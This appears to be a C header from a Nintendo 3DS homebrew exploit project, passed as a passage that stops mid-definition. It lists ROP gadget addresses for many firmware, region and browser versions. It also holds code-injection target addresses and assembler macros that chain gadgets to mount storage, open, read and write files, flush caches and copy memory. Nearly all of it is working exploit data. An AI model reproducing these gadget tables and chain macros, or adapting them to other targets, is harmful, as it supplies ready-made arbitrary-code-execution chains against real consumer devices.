#define DLPLAY_CODE_LOC_VA		0x00192800
#define DLPLAY_NSSHANDLE_LOC_VA		0x001A5200
#define KPROCESS_HANDLE			0xFFFF8001
#define GX_SetTextureCopy		0x00000004
#define FILE_READ			0x00000001
#define FILE_WRITE			0x00000002
#define FILE_CREATE			0x00000004
#define GARBAGE				0x00230040

#if defined(MSET_4X) || defined(MSET_4X_DG)
	#define ROP_LOC				0x002B0000
	#define	HANDLE_PTR			0x0027FAC4
	#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0013C5D4
	#define nn__gxlow__CTR__detail__GetInterruptReceiver	0x0027C580
	#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC	0x001AC924
	#define LDR_R0_0_POP_R4_PC		0x0012FBBC
	#define POP_PC				0x001002F9
	#define	POP_R0_PC			0x00143D8C
	#define POP_R1_PC			0x001C4FC4
//	#define POP_R1_PC			0x001549E1
	#define POP_R2_PC			0x0022952D
	#define POP_R3_PC			0x0010538C
	#define POP_R4_PC			0x001001ED
//	#define POP_R4_PC			0x001B3AA0
	#define POP_R0_R2_PC		0x0010F2B9
	#define POP_R1_2_3_PC 0x001549B1
	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x0018D5DC
	#define POP_R4_LR_BX_R2			0x001D9360
	#define STR_R1_0_POP_R4_PC		0x0010CCBC
	#define IFile_Open_LDMFD_SP_R4_5_6_7_8_PC	0x001B82A8
	#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x001B3954
	#define IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC	0x001B3B50
	#define SVC_0A_BX_LR			0x001AEA50
	#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x001BFA60
	#if defined(MSET_4X_DG) || defined(MSET_DG)
		#define CODE_TARGET			0x17EB0000
	#else
		#define CODE_TARGET			0x17FAD000
	#endif
#elif defined(MSET_6X)
	#define ROP_LOC				0x00290000
	#define	HANDLE_PTR			0x0028DBEC
	#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0013D3FC
	#define nn__gxlow__CTR__detail__GetInterruptReceiver	0x0028A580
	#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC	0x001B4E8C
	#define LDR_R0_0_POP_R4_PC		0x00130818
	#define POP_PC				0x001002F9
	#define	POP_R0_PC			0x00144CF8
	#define POP_R1_2_3_PC			0x0011BE4D
	#define POP_R1_PC			0x001CD804
	#define POP_R3_PC			0x00105110
	#define POP_R4_PC			0x001001ED
	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x0018B184
	#define POP_R4_LR_BX_R2			0x00192758
	#define STR_R1_0_POP_R4_PC		0x0010CF5C
	#define SVC_0A_BX_LR			0x001B6C6C
	#define IFile_Open_LDMFD_SP_R4_5_6_7_8_PC	0x001C08B4
	#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x001BC188
	#define IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC	0x001BC380
	#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x001C814C
	#define CODE_TARGET			0x17EA0000
#elif defined(SPIDER_20) //1.7412.JP/US/EU
	#define LDMFD_SP_R4_5_6_LR_BX_R12	0x0017E63C
	#define LDMFD_SP_R4_5_PC		0x00101418
	#define LDR_R0_0_POP_R4_PC		0x001CA228
	#define POP_PC				0x0010D8B4
	#define POP_R0_1_2_3_4_7_PC		0x001768FF
	#define POP_R1_PC			0x0026A124
	#define POP_R4_5_6_PC			0x00100D24
	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x00103D3C
	#define SP_LR_LDMFD_SP_LR_PC		0x002D5254
	#define STR_R1_0_POP_R4_PC		0x00119768
	#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x00332EBC
	#define IFile_Open_LDMFD_SP_R4_5_6_7_PC	0x0025B8AC
	#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x002FA3F0
	#define DMC				0x002A497F
	#define MAGIC				0x002D5240
	#define ROP_LOC				0x08CF2000
	#ifdef SPIDER_DG
		#define CODE_TARGET			0x195CE000
	#else
		#define CODE_TARGET			0x192CD000
	#endif
#elif defined(SPIDER_21) //1.7455.JP/US/EU
	#define LDMFD_SP_R4_5_6_LR_BX_R12	0x0017E764
	#define LDMFD_SP_R4_5_PC		0x00101418
	#define LDR_R0_0_POP_R4_PC		0x001CA350
	#define POP_PC				0x0010D954
	#define POP_R0_1_2_3_4_7_PC		0x00176A27
	#define POP_R1_PC			0x0026A528
	#define POP_R4_5_6_PC			0x00100D24
	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x00103D3C
	#define SP_LR_LDMFD_SP_LR_PC		0x002D5654
	#define STR_R1_0_POP_R4_PC		0x00119864
	#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x00333330
	#define IFile_Open_LDMFD_SP_R4_5_6_7_PC	0x0025BC00
	#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x002FA864
	#define DMC				0x002A4C57
	#define MAGIC				0x002D5640
	#define ROP_LOC				0x08CF2000
	#ifdef SPIDER_DG
		#define CODE_TARGET			0x195CE000
	#else
		#define CODE_TARGET			0x192CD000
	#endif
#elif defined(SPIDER_4X) //1.7498.JP/US/EU
	#define DLPLAY_CODE_LOC			(DLPLAY_CODE_LOC_VA-0x00100000+0x03F50000+0x14000000-0x4000)
	#define DLPLAY_HOOK_LOC			(0x1A3500-0x00100000+0x03F50000+0x14000000-0x4000)
	#define	HANDLE_PTR			0x003B643C
	#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x00344C2C
	#define nn__gxlow__CTR__detail__GetInterruptReceiver	0x003F54E8
	#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_PC	0x002CF3EC
	#define BLX_R5_LDMFD_SP_R4_5_6_7_8_PC	0x00354850
	#define CALL_BX_LR			0x0025DFF0
	#define CALL_BX_LR_2			0x00344B84
	#define CALL_3				0x002C62E4				
	#define LDMFD_SP_R4_5_6_LR_BX_R12	0x0018114C
	#define LDMFD_SP_R4_5_PC		0x00101408
	#define LDR_R0_0_POP_R4_PC		0x001CCC64
	#define POP_LR_PC			0x002D6A34
	#define POP_PC				0x0010DB6C
	#define	POP_R0_PC			0x002AD574
	#define POP_R1_2_3_PC			0x00217450
	#define POP_R0_1_2_3_4_PC		0x0029C170
//	#define POP_R0_1_2_3_4_PC		0x0022B550
	#define POP_R0_1_2_3_4_7_PC		0x0017943B
	#define POP_R1_PC			0x00269758
	#define	POP_R2_PC			0x0012F815
	#define POP_R2_3_PC			0x00231A24
	#define POP_R2_3_4_PC			0x00101878
	#define POP_R3_PC			0x0011B064
	#define POP_R4_PC			0x0010DAA8
	#define POP_R4_5_6_PC			0x00100D24
	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x00103DA8
	#define POP_R4_LR_BX_R2			0x00100C8C
	#define SP_LR_LDMFD_SP_LR_PC		0x002D6A30
	#define STR_R1_0_POP_R4_PC		0x00119B94
//	#define STR_R1_0_POP_R4_PC		0x0016F3FC
	#define SVC_0A_BX_LR			0x002A513C
	#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x00332BE8
	#define IFile_Open_LDMFD_SP_R4_5_6_7_PC	0x0025B0A4
	#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x002FC8E4
	#define IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC	0x00311D90
	#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x0029BF60
	#define DMC				0x002A5F27
	#define MAGIC				0x002D6A1C
	#define ROP_LOC				0x08B47400
//	#define ROP_LOC				0x08CF2000
	#ifdef SPIDER_DG
		#define CODE_TARGET			0x195D1000
	#else
		#define CODE_TARGET			0x192D3000
	#endif
#elif defined(SPIDER_42_CN) || defined(SPIDER_4X_KR) || defined(SPIDER_4X_TW) //1.7538.CN/KR/TW
	#define CALL_3				0x0011DD48
	#define DMC				0x0010509F //CN?
	#define LDMFD_SP_R4_5_PC		0x00101A44
	#define LDR_R0_0_POP_R4_PC		0x0011BADC
	#define POP_PC				0x001057B4
	#define	POP_R0_PC			0x0010C2F8
	#define POP_R3_PC			0x001050D4
	#define POP_R1_2_3_PC			0x00103DC8
	#define POP_R4_5_6_PC			0x0010014C //CN?
	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x00106598
	#define STR_R1_0_POP_R4_PC		0x00106684
	#if defined(SPIDER_42_CN) //1.7538.CN FW4.2
		#define	HANDLE_PTR			0x003D9704
		#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0012BD1C
		#define nn__gxlow__CTR__detail__GetInterruptReceiver	0x003D6C40
		#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC	0x0012BA40
		#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x0023F048
		#define SVC_0A_BX_LR			0x00104218
		#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x0019B640
		#define IFile_Open_LDMFD_SP_R4_5_6_7_8_PC	0x0022E334
		#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x001674BC
		#define IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC	0x00167544
		#define BLX_R5_LDMFD_SP_R4_5_6_7_8_PC	0x001B7F18
		#define CALL_BX_LR			0x0023E4DC
		#define CALL_BX_LR_2			0x00190118
		#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C469C
		#define POP_LR_PC			0x0012FE98
		#define POP_R0_1_2_3_4_7_PC		0x001932FB
		#define POP_R1_PC			0x00226B2C
		#define POP_R2_3_PC			0x0014C734
		#define SP_LR_LDMFD_SP_LR_PC		0x0012FE94
		#define MAGIC				0x0012FE80
		#ifdef SPIDER_DG
			#define CODE_TARGET			0x19593000
		#else
			#define CODE_TARGET			0x19357000
		#endif
	#elif defined(SPIDER_4X_KR) //1.7538.KR
		#define	HANDLE_PTR			0x003DA704
		#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0012BCF0
		#define nn__gxlow__CTR__detail__GetInterruptReceiver	0x003D7C40
		#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC	0x0012BA14
		#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x0023FF90
		#define SVC_0A_BX_LR			0x00104218
		#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x0019C258
		#define IFile_Open_LDMFD_SP_R4_5_6_7_8_PC	0x0022F284
		#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x001680F8
		#define IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC	0x00168180
		#define BLX_R5_LDMFD_SP_R4_5_6_7_8_PC	0x001B8B68
		#define CALL_BX_LR			0x0023F424
		#define CALL_BX_LR_2			0x00190D30
		#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C4EC4
		#define POP_LR_PC			0x0012FE6C
		#define POP_R0_1_2_3_4_7_PC		0x00193F13
		#define POP_R1_PC			0x00227A28
		#define POP_R2_3_PC			0x0014D2D8
		#define SP_LR_LDMFD_SP_LR_PC		0x0012FE68
		#define MAGIC				0x0012FE54
		#ifndef SPIDER_DG
			#define CODE_TARGET			0x19255000
		#endif
	#elif defined(SPIDER_4X_TW) //1.7538.TW
		#define	HANDLE_PTR			0x003DA704
		#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0012BD1C
		#define nn__gxlow__CTR__detail__GetInterruptReceiver	0x003D7C40 
		#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC	0x0012BA40
		#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x0023FFE4
		#define SVC_0A_BX_LR			0x00104218
		#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x0019C260
		#define IFile_Open_LDMFD_SP_R4_5_6_7_8_PC	0x0022F2D8
		#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x001680FC
		#define IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC	0x00168184
		#define BLX_R5_LDMFD_SP_R4_5_6_7_8_PC	0x001B8B70
		#define CALL_BX_LR			0x0023F478
		#define CALL_BX_LR_2			0x00190D34
		#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C4F14
		#define POP_LR_PC			0x0012FE98
		#define POP_R0_1_2_3_4_7_PC		0x00193F1B
		#define POP_R1_PC			0x00227A64
		#define POP_R2_3_PC			0x0014D29C
		#define SP_LR_LDMFD_SP_LR_PC		0x0012FE94
		#define MAGIC				0x0012FE80
		#ifndef SPIDER_DG
			#define CODE_TARGET			0x19355000
		#endif
	#endif
#elif defined(SPIDER_45_CN) //1.7538.CN FW4.5
	#define CALL_3				0x0011DD68
	#define DMC				0x001050CF
	#define LDMFD_SP_R4_5_PC		0x00101A40
	#define LDR_R0_0_POP_R4_PC		0x0011BB04
	#define POP_LR_PC			0x0012FEA8
	#define POP_PC				0x001057E4
	#define	POP_R0_PC			0x0010C324
	#define	POP_R1_PC			0x00226AF8
	#define POP_R1_2_3_PC			0x00103DC0
	#define POP_R2_3_PC			0x0014C26C
	#define POP_R3_PC			0x00105104
//	#define POP_R4_5_6_PC			0x?
	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x001065C8
	#define STR_R1_0_POP_R4_PC		0x001066B4
	#define	HANDLE_PTR			0x003D9704
	#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0012BD30 
	#define nn__gxlow__CTR__detail__GetInterruptReceiver	0x003D6C40
	#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC	0x0012BA54 
	#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x0023EFA0 
	#define SVC_0A_BX_LR			0x0010420C 
	#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x0019B138 
	#define IFile_Open_LDMFD_SP_R4_5_6_7_8_PC	0x0022E2B0 
	#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x00166FC8 
	#define IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC	0x00167050 
	#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C464C
	#define CALL_BX_LR			0x0023E434
	#define CALL_BX_LR_2			0x0018FC0C
	#define POP_R0_1_2_3_4_7_PC		0x00112211
	#define BLX_R5_LDMFD_SP_R4_5_6_7_8_PC	0x001B7A10
	#define SP_LR_LDMFD_SP_LR_PC		0x0012FEA4
	#define MAGIC				0x0012FE90
	#ifdef SPIDER_DG
		#define CODE_TARGET			0x19593000
	#else
		#define CODE_TARGET			0x19357000
	#endif
#elif defined(SPIDER_5X) || defined(SPIDER_5X_CN) || defined(SPIDER_5X_KR) || defined(SPIDER_5X_TW)
	#define CALL_3				0x0011DD80				
	#define DMC				0x001050CB
	#define LDMFD_SP_R4_5_PC		0x00101A40
	#define LDR_R0_0_POP_R4_PC		0x0011BB00
	#define POP_PC				0x001057E0
	#define	POP_R0_PC			0x0010C320
	#define POP_R1_2_3_PC			0x00103DC0
	#define POP_R3_PC			0x00105100
	#define POP_R4_5_6_PC			0x0010014C
	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x001065C4
//	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x0010CC4C
	#define STR_R1_0_POP_R4_PC		0x001066B0
	#define nn__gxlow__CTR__detail__GetInterruptReceiver	0x003D7C40
	#if defined(SPIDER_5X_CN) //1.7552.CN
		#define	HANDLE_PTR			0x003DA70C
		#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0012BD48
		#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC	0x0012BA6C
		#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x0023F80C
		#define SVC_0A_BX_LR			0x0010420C
		#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x0019B7D0
		#define IFile_Open_LDMFD_SP_R4_5_6_7_8_PC	0x0022EA5C
		#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x0016751C
		#define IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC	0x001675A4
		#define BLX_R5_LDMFD_SP_R4_5_6_7_8_PC	0x001B80A8
		#define CALL_BX_LR			0x0023ECA0
		#define CALL_BX_LR_2			0x001902A8
		#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C4E98
		#define POP_LR_PC			0x0012FEC0
		#define POP_R0_1_2_3_4_7_PC		0x0019348B
		#define POP_R1_PC			0x002272A0
		#define POP_R2_3_PC			0x0014C8AC
		#define SP_LR_LDMFD_SP_LR_PC		0x0012FEBC
		#define MAGIC				0x0012FEA8
	#elif defined(SPIDER_5X_KR) //1.7552.KR
		#define	HANDLE_PTR			0x003DA70C
		#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0012BD1C
		#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC	0x0012BA40
		#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x002407DC
		#define SVC_0A_BX_LR			0x0010420C
		#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x0019CA78
		#define IFile_Open_LDMFD_SP_R4_5_6_7_8_PC	0x0022FAC8
		#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x001686FC
		#define IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC	0x00168784
		#define BLX_R5_LDMFD_SP_R4_5_6_7_8_PC	0x001B9350
		#define CALL_BX_LR			0x0023FC70
		#define CALL_BX_LR_2			0x0019154C
		#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C5748
		#define POP_LR_PC			0x0012FE94
		#define POP_R0_1_2_3_4_7_PC		0x00194733
		#define POP_R1_PC			0x00228274
		#define POP_R2_3_PC			0x0014D49C
		#define SP_LR_LDMFD_SP_LR_PC		0x0012FE90
		#define MAGIC				0x0012FE7C
	#elif defined(SPIDER_5X_TW) //1.7552.TW
		#define	HANDLE_PTR			0x003DA70C
		#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0012BD48
		#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC	0x0012BA6C
		#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x00240870
		#define SVC_0A_BX_LR			0x0010420C
		#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x0019CAC0
		#define IFile_Open_LDMFD_SP_R4_5_6_7_8_PC	0x0022FB5C
		#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x00168744
		#define IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC	0x001687CC
		#define BLX_R5_LDMFD_SP_R4_5_6_7_8_PC	0x001B9398
		#define CALL_BX_LR			0x0023FD04
		#define CALL_BX_LR_2			0x00191594
		#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C57D8
		#define POP_LR_PC			0x0012FEC0
		#define POP_R0_1_2_3_4_7_PC		0x0019477B
		#define POP_R1_PC			0x002282F0
		#define POP_R2_3_PC			0x0014D4A4
		#define SP_LR_LDMFD_SP_LR_PC		0x0012FEBC
		#define MAGIC				0x0012FEA8
	#else //1.7552.JP/US/EU
		#define DLPLAY_CODE_LOC			(DLPLAY_CODE_LOC_VA-0x00100000+0x03F50000+0x14000000)
		#define DLPLAY_HOOK_LOC			(0x1A3500-0x00100000+0x03F50000+0x14000000)
		#define	HANDLE_PTR			0x003DA72C
		#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0012C228
		#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC	0x0012BF4C
		#define BLX_R5_LDMFD_SP_R4_5_6_7_8_PC	0x001B9300
		#define CALL_BX_LR			0x0023FFEC
		#define CALL_BX_LR_2			0x001914FC
		#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C5AC0
		#define POP_LR_PC			0x001303A4
		#define POP_R0_1_2_3_4_PC		0x0012A3D4
		#define POP_R0_1_2_3_4_7_PC		0x001946E3
		#define POP_R1_PC			0x00228B10
		#define POP_R2_3_PC			0x0014D554
		#define POP_R2_3_4_PC			0x001007B4
		#define POP_R4_PC			0x0010510C
		#define SP_LR_LDMFD_SP_LR_PC		0x001303A0
		#define SVC_0A_BX_LR			0x0010420C
		#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x0019CA28
		#define IFile_Open_LDMFD_SP_R4_5_6_7_8_PC	0x0022FE44
		#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x001686C0
		#define IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC	0x00168748
		#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x00240B58
		#define MAGIC				0x0013038C
		#define ROP_LOC				0x08B85400
//		#define ROP_LOC				0x088B5400
//		#define ROP_LOC				0x08CF208C
	#endif
#elif defined(SPIDER_9X) || defined(SPIDER_9X_CN) || defined(SPIDER_9X_KR) || defined(SPIDER_9X_TW)
	#define CALL_3				0x0011DD48				
	#define DMC				0x001050B3
	#define LDMFD_SP_R4_5_PC		0x00101A34
	#define LDR_R0_0_POP_R4_PC		0x0011BACC
	#define POP_PC				0x001057C4
	#define	POP_R0_PC			0x0010C2FC
	#define POP_R1_2_3_PC			0x00103DAC
	#define POP_R3_PC			0x001050E8
	#define POP_R4_5_6_PC			0x0010014C
	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x001065A8
	#define STR_R1_0_POP_R4_PC		0x00106694
	#define nn__gxlow__CTR__detail__GetInterruptReceiver	0x003D7C40
	#if defined(SPIDER_9X_CN) //1.7567.CN
		#define	HANDLE_PTR			0x003DA70C
		#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0012BD00
		#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC	0x0012BA24
		#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x0023F808
		#define SVC_0A_BX_LR			0x001041F8
		#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x0019B7E0
		#define IFile_Open_LDMFD_SP_R4_5_6_7_8_PC	0x0022EA24
		#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x00167540
		#define IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC	0x001675C8
		#define BLX_R5_LDMFD_SP_R4_5_6_7_8_PC	0x001B80B8
		#define CALL_BX_LR			0x0023ECA0
		#define CALL_BX_LR_2			0x001902B8
		#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C4EB0
		#define POP_LR_PC			0x012FE78
		#define POP_R0_1_2_3_4_7_PC		0x0019349B
		#define POP_R1_PC			0x0022728C
		#define POP_R2_3_PC			0x0014C8F4
		#define SP_LR_LDMFD_SP_LR_PC		0x0012FE74
		#define MAGIC				0x0012FE60
	#elif defined(SPIDER_9X_KR) //1.7567.KR
		#define	HANDLE_PTR			0x003DA70C
		#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0012BCD4
		#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC	0x0012B9F8
		#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x002407D4
		#define SVC_0A_BX_LR			0x001041F8
		#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x0019CA80
		#define IFile_Open_LDMFD_SP_R4_5_6_7_8_PC	0x0022FA8C
		#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x00168718
		#define IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC	0x001687A0
		#define BLX_R5_LDMFD_SP_R4_5_6_7_8_PC	0x001B9358
		#define CALL_BX_LR			0x0023FC6C
		#define CALL_BX_LR_2			0x00191554
		#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C5760
		#define POP_LR_PC			0x0012FE4C
		#define POP_R0_1_2_3_4_7_PC		0x0019473B
		#define POP_R1_PC			0x0022825C
		#define POP_R2_3_PC			0x0014D4E0
		#define SP_LR_LDMFD_SP_LR_PC		0x0012FE48
		#define MAGIC				0x0012FE34
	#elif defined(SPIDER_9X_TW) //1.7567.TW
		#define	HANDLE_PTR			0x003DA70C
		#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0012BD00
		#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC	0x0012BA24
		#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x00240868
		#define SVC_0A_BX_LR			0x001041F8
		#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x0019CAC8
		#define IFile_Open_LDMFD_SP_R4_5_6_7_8_PC	0x0022FB20
		#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x00168760
		#define IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC	0x001687E8
		#define BLX_R5_LDMFD_SP_R4_5_6_7_8_PC	0x001B93A0
		#define CALL_BX_LR			0x0023FD00
		#define CALL_BX_LR_2			0x0019159C
		#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C57F8
		#define POP_LR_PC			0x0012FE78
		#define POP_R0_1_2_3_4_7_PC		0x00194783
		#define POP_R1_PC			0x002282D8
		#define POP_R2_3_PC			0x0014D4E8
		#define SP_LR_LDMFD_SP_LR_PC		0x0012FE74
		#define MAGIC				0x0012FE60
	#else //1.7567.JP/US/EU
		#define DLPLAY_CODE_LOC			(DLPLAY_CODE_LOC_VA-0x00100000+0x03F50000+0x14000000)
		#define DLPLAY_HOOK_LOC			(0x03FF3500+0x14000000)
		#define	HANDLE_PTR			0x003DA72C
		#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0012C1E0
		#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC	0x0012BF04
		#define BLX_R5_LDMFD_SP_R4_5_6_7_8_PC	0x001B9308
		#define CALL_BX_LR			0x0023FFE8
		#define CALL_BX_LR_2			0x00191504
		#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C5AE0
		#define POP_LR_PC			0x0013035C
		#define POP_R0_1_2_3_4_PC		0x0010B5B4
		#define POP_R0_1_2_3_4_7_PC		0x001946EB
		#define POP_R1_PC			0x00228AF4
		#define POP_R2_3_PC			0x0014D598
		#define POP_R2_3_4_PC			0x001007B4
		#define POP_R4_PC			0x001050F0
		#define SP_LR_LDMFD_SP_LR_PC		0x00130358
		#define SVC_0A_BX_LR			0x001041F8
		#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x0019CA30
		#define IFile_Open_LDMFD_SP_R4_5_6_7_8_PC	0x0022FE08
		#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x001686DC
		#define IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC	0x00168764
		#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x00240B50
		#define MAGIC				0x00130344
		#define ROP_LOC				0x08B88400
//		#define ROP_LOC				0x08CF2000
	#endif
#else
	#error ROP version not defined
#endif
#if defined(MSET_4X) || defined(MSET_4X_DG) || defined(MSET_6X)
	#define CODE_ENTRY			0x00240000
	#define BUFFER_LOC			0x14700000
	#define rop_fs_mount(drive)		.word POP_R0_PC, drive, FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC + 4, GARBAGE, GARBAGE, GARBAGE
	#define rop_file_open(handle, filename, mode)	.word POP_R0_PC, handle, POP_R1_2_3_PC, ROP_LOC+filename, mode, GARBAGE, IFile_Open + 4, GARBAGE, GARBAGE, GARBAGE, GARBAGE, POP_PC
	#define rop_flush_data_cache(buffer, size) .word POP_R0_PC, HANDLE_PTR, POP_R1_2_3_PC, KPROCESS_HANDLE, buffer, size, GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC + 4, GARBAGE, GARBAGE, GARBAGE
	#if defined(MSET_6X)
		#define THIS				0x00287000
		#define rop_file_read(handle, readcount, buffer, size) .word POP_R0_PC, handle, POP_R1_2_3_PC, readcount, buffer, size, IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC + 4, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE
		#define rop_file_write(handle, writecount, buffer, size) .word POP_R1_2_3_PC, GARBAGE, POP_PC, GARBAGE, POP_R4_LR_BX_R2, GARBAGE, POP_PC, POP_R0_PC, handle, POP_R1_2_3_PC, writecount, buffer, size, IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC
		#define rop_memcpy(dst, src, size) .word POP_R0_PC, dst, POP_R1_2_3_PC, src, size, GARBAGE, MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR + 4, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE
